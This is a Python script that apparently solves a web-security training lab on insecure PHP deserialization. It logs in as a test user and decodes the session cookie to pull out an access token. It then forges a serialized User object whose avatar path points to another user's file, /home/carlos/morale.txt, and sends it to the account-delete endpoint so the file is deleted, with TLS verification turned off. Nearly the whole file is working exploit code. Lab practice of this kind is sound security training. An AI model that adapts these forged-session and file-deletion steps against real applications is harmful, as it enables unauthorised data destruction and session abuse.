import requests
from colorama import Fore
import urllib3
import base64
import re
from urllib.parse import unquote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Using application functionality to exploit insecure deserialization"


def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Login as wiener\n2. Decode the session and extracting the access token\n3. Encode the serialized object after modifying\n4. Delete account using the modified object\n""")

    url = url.rstrip('/')

    print("[1] FetLogging in as wiener")
    data = {"username": "wiener", "password": "peter"}
    wiener_login = requests.post(f"{url}/login", data=data, allow_redirects=False,
                                 verify=False, proxies=proxies)

    print("[2] Decoding the session and extracting the access token")

    base64_encoded_session = wiener_login.cookies.get("session")
    percent_decoded_session = unquote(base64_encoded_session)
    base64_decoded_session = base64.b64decode(percent_decoded_session).decode()
    access_token = re.findall("""token";s:32:"(\w*)";s:11""", base64_decoded_session)[0]
    print(Fore.GREEN + "access_token" + Fore.WHITE + " => " + Fore.YELLOW + access_token)

    print("[3] Encoding the serialized object after modifying")
    serialized = f"""O:4:"User":3:{{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"{access_token}";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}}"""
    serialized_encoded = base64.b64encode(serialized.encode()).decode()

    print("[4] Deleting carlos from the admin panel with the modified object as session")
    print("[+] Refresh the page if needed")
    cookies = {"session": serialized_encoded}

    requests.post(f"{url}/my-account/delete", cookies=cookies, allow_redirects=False,
                 verify=False, proxies=proxies)
    return True
